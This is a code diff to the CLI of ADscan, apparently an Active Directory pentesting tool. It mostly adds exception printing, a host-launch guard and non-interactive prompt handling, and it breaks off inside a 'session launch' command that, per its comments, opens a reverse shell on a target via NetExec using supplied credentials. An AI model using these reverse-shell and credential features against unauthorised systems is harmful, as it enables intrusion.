@@ -114,8 +114,10 @@ from adscan_internal.reporting_compat import (
 )
 from adscan_internal.session_summary import (
     count_workspace_credentials,
+    get_attack_path_snapshot_metrics,
     get_attack_path_summary_breakdown,
     resolve_session_attack_paths_for_summary,
+    select_attack_path_verdict,
 )
 from adscan_internal.ssl_certificates import configure_ssl_certificates
 from adscan_internal.subprocess_env import (
@@ -767,6 +769,7 @@ def _log_free_disk_space_debug(context: str) -> None:
     except Exception as exc:  # Best-effort logging; never raise
         try:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         except Exception:
             pass
         print_info_debug(f"[Disk] Failed to determine free space for {context}: {exc}")
@@ -786,6 +789,7 @@ def _get_free_disk_space_bytes(path: str = "/") -> int | None:
         return int(usage.free)
     except Exception as exc:  # pragma: no cover - depends on runtime environment
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(f"[Disk] Failed to determine free space for {path}: {exc}")
         return None
 
@@ -807,6 +811,7 @@ def _process_exit_cleanup():
             return
     except Exception as exc:  # pragma: no cover - best-effort shutdown
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(f"[atexit] Cleanup handler failed to run do_exit: {exc}")
     metadata = _build_command_metadata(shell=shell)
     print_info_debug("[atexit] Uploading session recording from cleanup handler")
@@ -1061,6 +1066,11 @@ from adscan_internal.cli.poisoning import (  # noqa: E402
     stop_poisoning,
 )
 
+from adscan_internal.cli.repl_completion import (  # noqa: E402
+    FLAG_COMPLETION_SPECS,
+    FlagAwareCompleter,
+)
+
 
 def _is_systemd_available() -> bool:
     """Return True when systemd is available as a service manager.
@@ -1238,6 +1248,7 @@ def _stop_dns_resolver_service_for_unbound(
         )
     except Exception as exc:  # pragma: no cover - env dependent
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
 
 def _start_unbound_without_systemd() -> bool:
@@ -1457,6 +1468,7 @@ def _ensure_dir_writable(
         os.makedirs(path, exist_ok=True)
     except PermissionError as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(
             f"{description} directory exists but cannot be created/accessed: {path}"
         )
@@ -1503,6 +1515,7 @@ def _ensure_dir_writable(
                     )
             except Exception as inner_exc:  # pragma: no cover - env dependent
                 telemetry.capture_exception(inner_exc)
+                print_exception(exception=inner_exc)
                 print_info_debug(
                     f"[check] Failed to repair {description} dir via sudo after PermissionError: {inner_exc}"
                 )
@@ -1518,6 +1531,7 @@ def _ensure_dir_writable(
         return False
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(f"Failed to ensure {description} directory exists: {path}")
         print_info_debug(f"[check] {description} mkdir error: {exc}")
         return False
@@ -1560,6 +1574,7 @@ def _ensure_dir_writable(
             )
     except Exception as exc:  # pragma: no cover - environment dependent
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug(
             f"[check] Failed to repair permissions for {description} dir {path}: {exc}"
         )
@@ -1732,6 +1747,7 @@ def _remove_legacy_adscan_sudo_alias(rcfile: str) -> bool:
         return True
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
 
@@ -1766,6 +1782,7 @@ def _cleanup_legacy_adscan_sudo_alias() -> None:
                 )
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_info_debug("[DEBUG] Failed to cleanup legacy ADscan auto-sudo alias")
 
 
@@ -1822,6 +1839,7 @@ def _guard_root_shell_without_user_context(command: str) -> None:
         raise
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
 
 def _is_rootless_container_runtime() -> bool:
@@ -2012,6 +2030,170 @@ def _guard_container_runtime_launcher_contract(command: str | None) -> None:
         print_instruction(
             "If it persists, run `adscan check` on the host to diagnose the host-helper setup."
         )
+    raise SystemExit(1)
+
+
+def _guard_host_direct_core_launch(command: str | None) -> None:
+    """Refuse to run the ADscan core (``adscan.py``) directly on the host.
+
+    The core runtime is designed to run ONLY inside the official runtime
+    container, launched by the PyPI launcher (the ``adscan`` console-script IS the
+    launcher — it ``docker run``s the image). Running ``adscan.py`` directly on the
+    host from a cloned source tree (``mode=host_process``) bypasses BOTH the
+    launcher and the container, so the bundled tools (kerbrute, unbound, massdns,
+    …), the loopback DNS/resolver setup, the privileged host-helper, and the
+    workspace-relative working directory are all absent — a silently degraded,
+    misleading run that also pollutes telemetry.
+
+    This complements :func:`_guard_container_runtime_launcher_contract`: that guard
+    fires only INSIDE the container (guarding a bare ``docker run <image>`` that
+    skips the launcher); this one closes the HOST/from-source vector it leaves
+    open. Both key on the same launcher-set signal
+    (:func:`_is_full_adscan_container_runtime` → ``ADSCAN_CONTAINER_RUNTIME=1``), so
+    a genuinely launched container is NEVER refused here — the load-bearing safety
+    property (a false refusal inside the real container would break every run).
+
+    Dev/CI are unaffected: they go through the launcher too
+    (``uv run adscan start --dev`` → launcher → container). The narrow, deliberately
+    undocumented escape ``ADSCAN_ALLOW_HOST_CORE=1`` exists only for the rare
+    internal debug that genuinely needs the core on the host.
+    """
+    # Inside the official container → this guard is not the concern; the
+    # in-container contract guard handles it. A real launched container always
+    # carries the marker, so it is never refused below.
+    if _is_full_adscan_container_runtime():
+        return
+    # Only the BARE HOST is this guard's concern. If we are inside ANY container
+    # (is_docker_env), a non-full-runtime invocation belongs to the
+    # container-contract guard, never here — e.g. the cheatsheet bake runs the
+    # render verb INSIDE the official PRO image with ADSCAN_HOME=/bake-home (so
+    # `_is_full_adscan_container_runtime()` is False) yet is legitimately
+    # containerized. Refusing there would break every build. This is the
+    # root-cause scope: "host" means not-in-a-container.
+    if is_docker_env():
+        return
+    # Lightweight verbs that legitimately run outside the container (mirrors the
+    # in-container guard's exemptions), plus the internal-only escape hatch.
+    if command in (None, "version", "host-helper"):
+        return
+    # Build-time cheatsheet/demo bake — the SAME escape the container-contract
+    # guard honors. `scripts/bake_cheatsheet.sh` runs the pure-render verb inside
+    # the official PRO image, deliberately WITHOUT the container-runtime marker
+    # (it uses ADSCAN_HOME=/bake-home so `_is_full_adscan_container_runtime()` is
+    # False), so this guard would otherwise fire on every LITE build. The env var
+    # is set ONLY by the bake script, never by users, and is limited to safe
+    # pure-render verbs.
+    if str(os.getenv("ADSCAN_BAKE_MODE") or "").strip() == "1" and command in (
+        "cheatsheet",
+        "demo",
+    ):
+        return
+    if str(os.getenv("ADSCAN_ALLOW_HOST_CORE") or "").strip() == "1":
+        return
+
+    try:
+        telemetry.capture(
+            "host_direct_core_launch_refused", {"command": str(command or "")}
+        )
+    except Exception:  # noqa: BLE001 - never let telemetry break the guard
+        pass
+
+    # Order the "run it correctly" guidance by how the user most likely got here.
+    # `adscan.py` only exists on the host inside a source checkout, so a cloned
+    # repo is the common case; detect it so the FIRST command we show is the one
+    # that actually applies to them (`uv run adscan …`), with the packaged-CLI
+    # path as the alternative (or vice-versa).
+    try:
+        _repo_root = Path(__file__).resolve().parent
+        _is_source_checkout = (_repo_root / "pyproject.toml").is_file() and (
+            _repo_root / "adscan_launcher"
+        ).is_dir()
+    except Exception:  # noqa: BLE001 - detection must never break the guard
+        _is_source_checkout = True
+
+    try:
+        from adscan_internal.rich_output import BRAND_COLORS
+
+        _teal = BRAND_COLORS.get("info", "#1B97A1")
+    except Exception:  # noqa: BLE001 - fall back to the brand tint literal
+        _teal = "#1B97A1"
+
+    from rich.console import Group
+    from rich.text import Text as _Text
+
+    def _cmd_line(cmd: str) -> _Text:
+        line = _Text("    ❯ ", style=f"bold {_teal}")
+        line.append(cmd, style=f"bold {_teal}")
+        return line
+
+    lead = _Text.from_markup(
+        "You launched the ADscan engine directly ([italic]adscan.py[/italic]). The engine is "
+        "built to run inside the container the launcher sets up for you — started on your host "
+        "on its own, it is missing everything it needs to actually scan:"
+    )
+
+    from rich.padding import Padding as _Padding
+    from rich.table import Table as _Table
+
+    _reasons_grid = _Table.grid(padding=(0, 1))
+    _reasons_grid.add_column(justify="left", style=_teal, no_wrap=True, vertical="top")
+    _reasons_grid.add_column(justify="left")
+    for reason in (
+        "the bundled tooling — kerbrute, unbound, massdns and the rest — so user enumeration and "
+        "password spraying quietly come back empty",
+        "the loopback DNS resolver the launcher wires to your target domain — so the domain "
+        "controllers never resolve and Kerberos / LDAP fail",
+        "the isolated per-scan workspace and the network privileges — so anything that does run "
+        "returns partial results with no sign that they are wrong",
+    ):
+        _reasons_grid.add_row("•", reason)
+    # Indent the whole bullet block two columns so the markers sit just inside
+    # the body text, and hang wrapped lines under the reason column.
+    reasons = _Padding(_reasons_grid, (0, 0, 0, 2))
+
+    consequence = _Text.from_markup(
+        "So it would run, look clean, and hand you a result that is not real. Stopping here is "
+        "how ADscan keeps you from trusting an empty scan."
+    )
+
+    section = _Text("Run it the right way", style=f"bold {_teal}")
+
+    from_source = [
+        _Text.from_markup("From this cloned repo:"),
+        _cmd_line("uv run adscan start"),
+    ]
+    from_install = [
+        _Text.from_markup("Installed the CLI with pip / pipx:"),
+        _cmd_line("adscan start"),
+        _Text.from_markup("[dim]    (not installed yet? → [/dim][default]pipx install adscan[/default][dim])[/dim]"),
+    ]
+    run_blocks = (from_source + [_Text("")] + from_install) if _is_source_checkout else (
+        from_install + [_Text("")] + from_source
+    )
+
+    footer = _Text.from_markup(
+        "[dim]Either way the launcher pulls the official image and runs the engine inside it — "
+        "the same goes for [/dim][default]adscan ci[/default][dim], [/dim]"
+        "[default]adscan doctor[/default][dim] and every other command.[/dim]"
+    )
+
+    print_panel(
+        Group(
+            lead,
+            reasons,
+            _Text(""),
+            consequence,
+            _Text(""),
+            section,
+            _Text(""),
+            *run_blocks,
+            _Text(""),
+            footer,
+        ),
+        title="[bold]🧭 Launch ADscan through its launcher[/bold]",
+        border_style=_teal,
+        padding=(1, 2),
+    )
     raise SystemExit(1)
 
 
@@ -2638,6 +2820,7 @@ def _setup_external_tool(
                                     pass
                     except Exception as venv_fallback_e:
                         telemetry.capture_exception(venv_fallback_e)
+                        print_exception(exception=venv_fallback_e)
                         print_error(
                             f"Failed to create venv for {tool_name} even with fallback: {venv_fallback_e}"
                         )
@@ -2744,6 +2927,7 @@ def _ensure_wordlist_installed(
         return os.path.exists(final_wl_path)
     except Exception as exc:  # pragma: no cover - network/environment dependent
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
 
@@ -2828,6 +3012,7 @@ def _get_python_package_version(
         )
     except FileNotFoundError as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(
             f"Python executable '{python_executable}' not found when checking version for {package_name}."
         )
@@ -2847,6 +3032,7 @@ def _get_latest_pypi_version(package_name: str, timeout: int = 5) -> Optional[st
         response = requests.get(url, timeout=timeout)
     except requests.RequestException as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(f"Failed to query PyPI for {package_name}: {exc}")
         return None
 
@@ -2860,6 +3046,7 @@ def _get_latest_pypi_version(package_name: str, timeout: int = 5) -> Optional[st
         payload = response.json()
     except ValueError as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         print_warning(f"PyPI response for {package_name} is not valid JSON: {exc}")
         return None
 
@@ -3070,6 +3257,7 @@ def _assess_version_compliance(
             latest_parsed = version.parse(latest_version)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             return (
                 "warning",
                 f"Failed to compare versions for {package_name}: {exc}",
@@ -3249,6 +3437,7 @@ try:
 except Exception as exc:  # pragma: no cover - best-effort logging only
     try:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
     except Exception:
         pass
 
@@ -3354,8 +3543,11 @@ class CredentialCompleter(Completer):
         if len(parts) < 2:
             return None
 
-        # Domain is typically the first argument after command
-        potential_domain = parts[1]
+        # NestedCompleter has already stripped the command stem (see
+        # docs/superpowers/plans/2026-07-21-repl-flag-argument-grammar.md
+        # Phase 2 Investigation §1-2) — the domain is token 0 of what THIS
+        # method receives, not token 1.
+        potential_domain = parts[0]
 
         # Check if it looks like a domain (contains dot or is in known domains)
         if "." in potential_domain or potential_domain in self.shell_instance.domains:
@@ -3639,6 +3831,7 @@ def run_command(
         raise
     except subprocess.TimeoutExpired as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         cmd_display = (
             command_arg
             if isinstance(command_arg, str)
@@ -3653,6 +3846,7 @@ def run_command(
         # This is expected behavior when checking if a command exists
         if check:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
         cmd_name = (
             command_arg
             if isinstance(command_arg, str)
@@ -3883,6 +4077,7 @@ from adscan_internal.cli.common import (  # noqa: E402
     normalize_command_alias,
     normalize_help_alias,
     redact_command_for_log,
+    resolve_repl_domain_or_default,
     should_show_workspace_getting_started,
 )
 
@@ -4130,6 +4325,7 @@ def _maybe_run_rating_funnel(shell, value_tier: str | None) -> bool:
         return bool(run_rating_funnel(shell, value_tier=value_tier))
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
 
@@ -4351,6 +4547,7 @@ def _detect_distribution():
 
     except (OSError, IOError, FileNotFoundError, KeyError, ValueError) as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         # Default to Debian if detection fails
         return {
             "id": "debian",
@@ -4773,6 +4970,7 @@ def _get_debian_base_version(distro_id, version_codename):
 
     except Exception as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         if VERBOSE_MODE or DEBUG_MODE:
             print_warning(f"Error detecting Debian base version: {e}")
         return "bookworm"  # Safe default
@@ -5124,6 +5322,7 @@ def _ensure_rustup_default_toolchain(env: dict[str, str] | None = None) -> bool:
         return True
     except Exception as exc:  # pragma: no cover - environment dependent
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
 
@@ -5726,6 +5925,7 @@ def _configure_pyenv_path_in_session():
         return len(paths_to_prepend) > 0
     except Exception as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         print_warning(f"Error configuring pyenv PATH in current session: {e}")
         return False
 
@@ -5798,6 +5998,7 @@ def _ensure_pyenv_in_path():
 
     except Exception as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         print_warning(f"Error ensuring pyenv in PATH: {e}")
         return False, False
 
@@ -5896,6 +6097,7 @@ def _configure_pyenv_shell():
 
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_warning(f"Could not configure pyenv in {shell_config_file}: {e}")
 
         # Also configure universal profile as backup (for bash/zsh syntax)
@@ -5927,6 +6129,7 @@ def _configure_pyenv_shell():
 
     except Exception as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         print_warning(f"Error configuring pyenv in shell: {e}")
         return False
 
@@ -6170,6 +6373,7 @@ def _check_and_ensure_pyenv_status(python_version="3.12.3", auto_configure=True)
             print_info_debug(f"[pyenv] pyenv root probe: {marked_probe}")
     except Exception as exc:
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
     status = {
         "installed": False,
         "executable_exists": False,
@@ -6327,6 +6531,7 @@ def _regenerate_pyenv_shims(pyenv_cmd_list=None):
         return True
     except Exception as e:
         telemetry.capture_exception(e)
+        print_exception(exception=e)
         print_warning(f"Failed to regenerate pyenv shims: {e}")
         return False
 
@@ -6389,6 +6594,7 @@ def _fix_pyenv_shims_permissions(pyenv_root: str, *, require_sudo: bool) -> bool
         return bool(os.access(pyenv_shims_path, os.W_OK))
     except Exception as exc:  # pragma: no cover - environment dependent
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         return False
 
 
@@ -6495,9 +6701,11 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                     )
             except Exception as perm_e:
                 telemetry.capture_exception(perm_e)
+                print_exception(exception=perm_e)
                 print_warning(f"Failed to fix pyenv permissions: {perm_e}")
     except Exception as check_e:
         telemetry.capture_exception(check_e)
+        print_exception(exception=check_e)
         print_warning(f"Error checking pyenv: {check_e}")
 
     # Install pyenv if not detected
@@ -6519,6 +6727,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                 print_info(f"Removed existing pyenv directory at {pyenv_root}")
             except Exception as rm_e:
                 telemetry.capture_exception(rm_e)
+                print_exception(exception=rm_e)
                 print_warning(
                     f"Failed to remove existing pyenv directory {pyenv_root}: {rm_e}"
                 )
@@ -6629,6 +6838,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                 _fix_pyenv_shims_permissions(pyenv_root, require_sudo=False)
     except Exception as exc:  # pragma: no cover - best effort
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
     if not pyenv_cmd_list:
         print_error("Could not determine pyenv command after installation attempts.")
@@ -6804,6 +7014,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                                     subprocess.TimeoutExpired,
                                 ) as import_test_e:
                                     telemetry.capture_exception(import_test_e)
+                                    print_exception(exception=import_test_e)
                                     print_error(
                                         f"Python installation appears corrupted - basic imports failed: {import_test_e}"
                                     )
@@ -6816,6 +7027,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                         FileNotFoundError,
                     ) as verify_e:
                         telemetry.capture_exception(verify_e)
+                        print_exception(exception=verify_e)
                         print_error(
                             f"Python {python_version} was installed but cannot be executed: {verify_e}"
                         )
@@ -6827,6 +7039,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                     return False, pyenv_cmd_list, None
             except subprocess.CalledProcessError as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_error(
                     f"Failed to install Python {python_version} using pyenv: {e}"
                 )
@@ -6886,6 +7099,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                 return False, pyenv_cmd_list, None
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_error(
                     f"Unexpected error installing Python {python_version} using pyenv: {e}"
                 )
@@ -6941,6 +7155,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                     )
         except Exception as e_which:
             telemetry.capture_exception(e_which)
+            print_exception(exception=e_which)
             print_warning(
                 f"Failed to determine Python executable using 'pyenv global' or 'pyenv which python': {e_which}"
             )
@@ -7049,6 +7264,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                                 shutil.rmtree(venv_path)
                             except Exception as rm_e:
                                 telemetry.capture_exception(rm_e)
+                                print_exception(exception=rm_e)
                                 print_error(f"Could not remove broken venv: {rm_e}")
                                 return False, pyenv_cmd_list, python_executable_path
                     else:
@@ -7059,6 +7275,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                             shutil.rmtree(venv_path)
                         except Exception as rm_e:
                             telemetry.capture_exception(rm_e)
+                            print_exception(exception=rm_e)
                             print_error(f"Could not remove incomplete venv: {rm_e}")
                             return False, pyenv_cmd_list, python_executable_path
 
@@ -7095,6 +7312,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                             download_success = True
                         except Exception as download_e:
                             telemetry.capture_exception(download_e)
+                            print_exception(exception=download_e)
                             print_error(f"Failed to download get-pip.py: {download_e}")
 
                         if download_success:
@@ -7314,6 +7532,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
 
                                 except subprocess.CalledProcessError as pip_install_e:
                                     telemetry.capture_exception(pip_install_e)
+                                    print_exception(exception=pip_install_e)
                                     if (
                                         hasattr(pip_install_e, "returncode")
                                         and pip_install_e.returncode < 0
@@ -7339,6 +7558,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                                     return False, pyenv_cmd_list, python_executable_path
                                 except Exception as pip_install_e:
                                     telemetry.capture_exception(pip_install_e)
+                                    print_exception(exception=pip_install_e)
                                     print_error(
                                         f"Failed to install pip using get-pip.py: {pip_install_e}"
                                     )
@@ -7350,6 +7570,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                                         pass
                             except Exception as verify_file_e:
                                 telemetry.capture_exception(verify_file_e)
+                                print_exception(exception=verify_file_e)
                                 print_error(
                                     f"Error verifying downloaded get-pip.py: {verify_file_e}"
                                 )
@@ -7361,6 +7582,7 @@ def _install_pyenv_python_and_venv(python_version="3.12.3", venv_path=None):
                             return False, pyenv_cmd_list, python_executable_path
                     except Exception as venv_retry_e:
                         telemetry.capture_exception(venv_retry_e)
+                        print_exception(exception=venv_retry_e)
                         print_error(
                             f"Failed to create venv even without pip: {venv_retry_e}"
                         )
@@ -8720,6 +8942,7 @@ def _make_create_shell(*, use_tui: bool):
                         f"'{exc.name}' is missing."
                     )
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
                     return shell
                 raise
 
@@ -8793,6 +9016,7 @@ def run_with_timeout(timeout):
                 return result
             except TimeoutError as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 # If a timeout occurs, kill any child process
                 current_process = psutil.Process()
                 children = current_process.children(recursive=True)
@@ -8801,6 +9025,7 @@ def run_with_timeout(timeout):
                         child.kill()
                     except psutil.NoSuchProcess as no_process_error:
                         telemetry.capture_exception(no_process_error)
+                        print_exception(exception=no_process_error)
                 signal.alarm(0)  # Disable the alarm
                 raise
             finally:
@@ -9234,6 +9459,7 @@ class PentestShell:
                     _need_dcsync_for_flags = True
             except Exception as _exc:  # noqa: BLE001
                 telemetry.capture_exception(_exc)
+                print_exception(exception=_exc)
 
         # STATE-driven: run the full "all" replication unless an attack-path
         # DCSync step already did it (is_full_ntds_replicated) — so it happens
@@ -9292,6 +9518,7 @@ class PentestShell:
                                     )
                         except Exception as _tgt_exc:  # noqa: BLE001
                             telemetry.capture_exception(_tgt_exc)
+                            print_exception(exception=_tgt_exc)
                             print_info_debug(
                                 f"[ctf-flags] TGT pre-fetch for "
                                 f"{mark_sensitive(picked_user, 'user')} failed "
@@ -9306,6 +9533,7 @@ class PentestShell:
                     )
             except Exception as _exc:  # noqa: BLE001
                 telemetry.capture_exception(_exc)
+                print_exception(exception=_exc)
             self.ask_for_flags(
                 domain, picked_user, picked_secret, secret_kind=picked_kind
             )
@@ -9410,6 +9638,7 @@ class PentestShell:
             except Exception as e:
                 try:
                     telemetry.capture_exception(e)
+                    print_exception(exception=e)
                 except Exception:
                     pass
             return None
@@ -9486,6 +9715,7 @@ class PentestShell:
             # Fall back and capture exception in telemetry
             try:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
             except Exception:
                 pass
             try:
@@ -9510,6 +9740,7 @@ class PentestShell:
                         except Exception as e2:
                             try:
                                 telemetry.capture_exception(e2)
+                                print_exception(exception=e2)
                             except Exception:
                                 pass
                             try:
@@ -9584,7 +9815,16 @@ class PentestShell:
         timeout_result: bool | None = None,
         context: dict[str, object] | None = None,
     ) -> bool | None:
-        """Request a yes/no decision with optional remote delegation."""
+        """Request a yes/no decision with optional remote delegation.
+
+        Non-interactive runs (``adscan ci`` under Docker ``-it``, where
+        ``sys.stdin.isatty()`` may still report ``True``) must never block on
+        the raw ``Confirm.ask`` fallback below — that hangs waiting on stdin.
+        The remote-interaction branch above is intentionally exempt from this
+        short-circuit: it is the mechanism a web-orchestrated ``ci`` run uses
+        to ask a real human via the dashboard while the CLI itself stays
+        unattended, so it must still get a chance to resolve first.
+        """
         remote_context = dict(context or {})
         allow_remote_interaction = bool(remote_context.pop("remote_interaction", False))
         if allow_remote_interaction:
@@ -9603,6 +9843,20 @@ class PentestShell:
                 return remote_confirmation
             if is_remote_interaction_enabled():
                 return timeout_result
+
+        from adscan_internal.interaction import is_non_interactive  # noqa: PLC0415
+
+        if is_non_interactive(self):
+            from adscan_core.output import print_telemetry_only  # noqa: PLC0415
+
+            print_info_debug(
+                f"[confirm] Non-interactive; auto-resolving '{prompt}' to default: {default}"
+            )
+            print_telemetry_only(
+                f"[confirm][answer] {prompt}: {'Yes' if default else 'No'}"
+            )
+            return default
+
         return Confirm.ask(prompt, default=default)
 
     def _questionary_checkbox(
@@ -9797,6 +10051,7 @@ class PentestShell:
         except Exception as e:
             # Don't fail the workflow if tracking fails
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             if DEBUG_MODE:
                 print_warning(f"Failed to track non-whitelisted lab: {e}")
 
@@ -10042,6 +10297,7 @@ class PentestShell:
             return None
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             # Fallback to simple selection
             print_warning(
                 f"Fuzzy search failed: {e}. Falling back to simple selection."
@@ -10733,6 +10989,7 @@ class PentestShell:
         except Exception as exc:  # noqa: BLE001
             # Best-effort: telemetry must never break shell startup.
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(
                 f"(telemetry-streamer) init failed: {type(exc).__name__}: {exc}"
             )
@@ -10771,7 +11028,12 @@ class PentestShell:
         # TTC is in domain_compromise.duration_minutes
         self._session_first_attack_path_time: Optional[float] = None  # TTFAP
         self._session_first_hash_time: Optional[float] = None  # TTFH
-        self._session_attack_paths_count: int = 0  # Total attack paths found
+        # Vestigial: never incremented anywhere. The attack-path counts come from
+        # the persisted snapshot SSOT (session_summary.get_attack_path_snapshot_metrics
+        # / select_attack_path_verdict); this attribute survives only as the 0
+        # fallback_count for resolve_session_attack_paths_for_summary. Do NOT
+        # resurrect it as a live counter — the snapshot is the source of truth.
+        self._session_attack_paths_count: int = 0
         self._session_credentials_count: int = 0  # Total credentials obtained
         self._session_hashes_count: int = 0  # Total hashes extracted
         self._session_compromise_status: str = SESSION_COMPROMISE_STATUS_UNKNOWN
@@ -10808,6 +11070,7 @@ class PentestShell:
             register_clock_resync_for_shell(self)
         except Exception as exc:  # noqa: BLE001 — backstop arming must not break startup
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(
                 f"(clock-resync-backstop) arming failed: {type(exc).__name__}: {exc}"
             )
@@ -10825,6 +11088,7 @@ class PentestShell:
             register_spn_candidate_resolver_for_shell(self)
         except Exception as exc:  # noqa: BLE001 — arming must not break startup
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(
                 f"(spn-candidate-resolver) arming failed: {type(exc).__name__}: {exc}"
             )
@@ -11099,6 +11363,7 @@ class PentestShell:
             print_info_debug("Timedatectl set to true")
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             pass
 
         # Start the output processor thread
@@ -11146,6 +11411,7 @@ class PentestShell:
                     }
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_error(
                     f"Error loading technical report cache: {self.technical_report_file}"
                 )
@@ -11363,6 +11629,7 @@ class PentestShell:
                         "output_preview": timeout_preview or None,
                     },
                 )
+                print_exception(exception=exc)
                 try:
                     print_error_verbose(
                         f"Command timed out after {timeout if timeout is not None else 'unknown'}s: "
@@ -11376,6 +11643,7 @@ class PentestShell:
         except Exception as exc:
             if not ignore_errors:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
             # Mark last error as generic failure
             setattr(self, "_last_run_command_error", ("error", exc))
             return None
@@ -11458,6 +11726,7 @@ class PentestShell:
         except Exception as exc:
             if not ignore_errors:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
             return None
 
     def run_external_command(
@@ -11517,6 +11786,7 @@ class PentestShell:
                     item_type, item_payload = self.output_queue.get(timeout=0.1)
                 except queue.Empty as e:
                     telemetry.capture_exception(e)
+                    print_exception(exception=e)
                     continue  # No item, continue to check stop_event or queue status
 
                 if item_type == "PRINT":
@@ -11527,6 +11797,7 @@ class PentestShell:
                         self.console.print(*print_args, **print_kwargs)
                     except Exception as e_print:
                         telemetry.capture_exception(e_print)
+                        print_exception(exception=e_print)
                         if DEBUG_MODE:
                             print(
                                 f"[ERROR][OutputThread] Exception during console.print: {e_print}",
@@ -11603,6 +11874,7 @@ class PentestShell:
 
                     except Exception as e_rich_prompt:
                         telemetry.capture_exception(e_rich_prompt)
+                        print_exception(exception=e_rich_prompt)
                         print(
                             f"[ERROR][OutputThread] Exception during rich.prompt for {prompt_id} ('{str(question_text)[:50]}...'): {e_rich_prompt}",
                             file=sys.stderr,
@@ -11642,6 +11914,7 @@ class PentestShell:
             Exception
         ) as e_loop_fatal:  # Catch broader exceptions that could kill the loop
             telemetry.capture_exception(e_loop_fatal)
+            print_exception(exception=e_loop_fatal)
             print_info_debug(
                 f"[CRITICAL][OutputThread] _output_processor_loop DIED: {e_loop_fatal}"
             )
@@ -11812,6 +12085,7 @@ class PentestShell:
                         self.output_queue.join()
                     except Exception as e:
                         telemetry.capture_exception(e)
+                        print_exception(exception=e)
                         # Use console for debug print if available
                         print_info_debug(
                             f"Exception during output_queue.join() on signal_handler: {e}"
@@ -11852,6 +12126,7 @@ class PentestShell:
                 self.workspace_save()
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_error(f"Error during auto-save: {str(e)}")
 
     # =========================================================================
@@ -12137,24 +12412,59 @@ class PentestShell:
         elif command == "launch":
             # Launch a reverse shell on a target host via NetExec and bind it to
             # the active listener. Currently supports smb and winrm services.
-            if len(sub_args) < 5:
-                print_error(
-                    "Usage: session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]"
+            #
+            # Usage:
+            #   session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]
+            #   session launch --service <smb|winrm> --host <host> -d <domain> -u <username> -p <password> [--os windows|linux]
+            #
+            # Both forms are permanently supported. In the flag form, a secret
+            # value starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
+            from adscan_internal.cli.repl_args import ReplArgumentParser, parse_command_args
+
+            launch_usage = (
+                "session launch <smb|winrm> <host> <domain> <username> <password> [windows|linux]  |  "
+                "session launch --service <smb|winrm> --host <host> -d <domain> -u <username> -p <password> [--os windows|linux]"
+            )
+            launch_tokens = sub_args
